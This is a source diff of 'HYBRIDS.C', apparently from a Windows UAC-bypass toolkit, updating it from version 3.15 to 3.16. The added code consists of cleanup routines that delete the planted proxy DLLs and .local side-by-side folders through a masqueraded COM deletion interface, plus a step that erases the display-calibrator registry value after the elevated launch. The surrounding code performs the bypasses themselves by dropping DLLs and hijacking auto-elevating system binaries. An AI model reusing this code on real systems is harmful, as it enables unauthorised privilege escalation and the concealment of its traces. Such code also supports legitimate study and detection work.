@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.15
+*  VERSION:     3.16
 *
-*  DATE:        15 Feb 2019
+*  DATE:        11 Mar 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -23,6 +23,35 @@
 LOAD_PARAMETERS_SIREFEF g_SirefefLoadParams;
 
 /*
+* ucmMethodCleanupSingleFileSystem32
+*
+* Purpose:
+*
+* Post execution cleanup routine.
+*
+* lpItemName length limited to MAX_PATH
+*
+*/
+BOOL ucmMethodCleanupSingleItemSystem32(
+    LPWSTR lpItemName
+)
+{
+    BOOL bResult;
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+    _strcat(szBuffer, lpItemName);
+
+    MessageBox(0, szBuffer, NULL, 0);
+
+    bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+    if (bResult) {
+        OutputDebugString(szBuffer);
+    }
+    return bResult;
+}
+
+/*
 * ucmAvrfMethod
 *
 * Purpose:
@@ -37,7 +66,7 @@ BOOL ucmAvrfMethod(
     _In_ DWORD AvrfDllSize
 )
 {
-    BOOL bResult = FALSE, cond = FALSE, bWusaNeedCleanup = FALSE;
+    BOOL bResult = FALSE, bWusaNeedCleanup = FALSE;
     HKEY hKey = NULL, hSubKey = NULL;
     LRESULT lRet;
     DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
@@ -136,7 +165,7 @@ BOOL ucmAvrfMethod(
             ucmWusaCabinetCleanup();
         }
 
-    } while (cond);
+    } while (FALSE);
 
     if (hKey != NULL) {
         NtClose(hKey);
@@ -1250,7 +1279,7 @@ BOOL ucmSXSMethod(
     _In_ BOOL bConsentItself
 )
 {
-    BOOL     bCond = FALSE, bResult = FALSE;
+    BOOL     bResult = FALSE;
     WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
     SIZE_T   sz;
     LPWSTR   lpSxsPath = NULL;
@@ -1379,10 +1408,45 @@ BOOL ucmSXSMethod(
         }
         bResult = supRunProcess(szDst, NULL);
 
-    } while (bCond);
+    } while (FALSE);
 
     if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
     if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
+
+    return bResult;
+}
+
+/*
+* ucmSXSMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for SXSMethod.
+*
+*/
+BOOL ucmSXSMethodCleanup(
+    _In_ BOOL bConsentItself
+)
+{
+    BOOL bResult;
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+
+    if (bConsentItself) {
+        _strcat(szBuffer, CONSENT_EXE);
+    }
+    else {
+        _strcat(szBuffer, SYSPREP_DIR);
+        _strcat(szBuffer, SYSPREP_EXE);
+    }
+    _strcat(szBuffer, LOCAL_SXS);
+
+    bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+
+    if (bResult) {
+        OutputDebugString(szBuffer);
+    }
 
     return bResult;
 }
@@ -1665,7 +1729,7 @@ BOOL ucmJunctionMethod(
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bDropComplete = FALSE, bCond = FALSE, bWusaNeedCleanup = FALSE;
+    BOOL bResult = FALSE, bDropComplete = FALSE, bWusaNeedCleanup = FALSE;
     HKEY hKey = NULL;
     LRESULT lResult;
 
@@ -1772,7 +1836,7 @@ BOOL ucmJunctionMethod(
         _strcat(szBuffer, DCOMCNFG_EXE);
         bResult = supRunProcess(szBuffer, NULL);
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
@@ -1784,6 +1848,107 @@ BOOL ucmJunctionMethod(
         //
         ucmWusaCabinetCleanup();
     }
+
+    return bResult;
+}
+
+/*
+* ucmJunctionMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for JunctionMethod.
+*
+*/
+BOOL ucmJunctionMethodCleanup(
+    VOID
+)
+{
+    BOOL bResult = FALSE;
+
+    HKEY hKey = NULL;
+    LRESULT lResult;
+
+    LPWSTR lpTargetDirectory = NULL, lpEnd = NULL, lpTargetDll = NULL;
+
+    DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    do {
+
+        if (g_ctx->dwBuildNumber < 9600) {
+            lpTargetDll = OLE32_DLL;
+        }
+        else {
+            lpTargetDll = MSCOREE_DLL;
+        }
+
+        //
+       // Locate target directory.
+       //
+        lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_DOTNET_CLIENT, 0, MAXIMUM_ALLOWED, &hKey);
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        lResult = RegQueryInfoKey(hKey,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            &cValues,
+            &cbMaxValueNameLen,
+            NULL,
+            NULL,
+            NULL);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        if ((cValues == 0) || (cbMaxValueNameLen == 0))
+            break;
+
+        if (cbMaxValueNameLen > MAX_PATH)
+            break;
+
+        //
+        // Delete target file in each.
+        //
+        for (i = 0; i < cValues; i++) {
+
+            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+            bytesIO = MAX_PATH;
+
+            lResult = RegEnumValue(hKey,
+                i,
+                (LPWSTR)&szBuffer,
+                &bytesIO,
+                NULL,
+                NULL,
+                NULL,
+                NULL);
+
+            lpTargetDirectory = _filepath(szBuffer, szBuffer);
+            if (lpTargetDirectory == NULL) {
+                break;
+            }
+
+            lpEnd = _strend(lpTargetDirectory);
+            if (*(lpEnd - 1) != TEXT('\\'))
+                _strcat(lpEnd, TEXT("\\"));
+
+            _strcat(szBuffer, lpTargetDll);
+
+            if (ucmMasqueradedDeleteDirectoryFileCOM(szBuffer)) {
+                OutputDebugString(szBuffer);
+            }
+        }
+
+        bResult = TRUE;
+
+    } while (FALSE);
 
     return bResult;
 }
@@ -1802,7 +1967,7 @@ BOOL ucmSXSDccwMethod(
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL     bCond = FALSE, bResult = FALSE, bWusaNeedCleanup = FALSE;
+    BOOL     bResult = FALSE, bWusaNeedCleanup = FALSE;
     HMODULE  hGdiPlus = NULL;
     WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
     SIZE_T   sz;
@@ -1906,7 +2071,7 @@ BOOL ucmSXSDccwMethod(
         //
         bResult = supRunProcess(szTarget, NULL);
 
-    } while (bCond);
+    } while (FALSE);
 
     //
     // Cleanup resources.
@@ -1915,6 +2080,35 @@ BOOL ucmSXSDccwMethod(
     if (lpszFullDllPath) supVirtualFree(lpszFullDllPath, NULL);
     if (lpSxsPath) supVirtualFree(lpSxsPath, NULL);
     if (bWusaNeedCleanup) ucmWusaCabinetCleanup();
+
+    return bResult;
+}
+
+/*
+* ucmSXSDccwMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for SXSDccwMethod.
+*
+*/
+BOOL ucmSXSDccwMethodCleanup(
+    VOID
+)
+{
+    BOOL bResult;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+    _strcat(szBuffer, DCCW_EXE);
+    _strcat(szBuffer, LOCAL_SXS);
+
+    bResult = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+
+    if (bResult) {
+        OutputDebugString(szBuffer);
+    }
 
     return bResult;
 }
@@ -2312,6 +2506,16 @@ BOOL ucmDccwCOMMethod(
         // Run our "custom calibrator".
         //
         r = ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);
+
+        Sleep(1000);
+
+        //
+        // Remove calibrator value.
+        //
+        CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil,
+            HKEY_LOCAL_MACHINE,
+            T_DISPLAY_CALIBRATION,
+            T_CALIBRATOR_VALUE);
 
     } while (bCond);
 
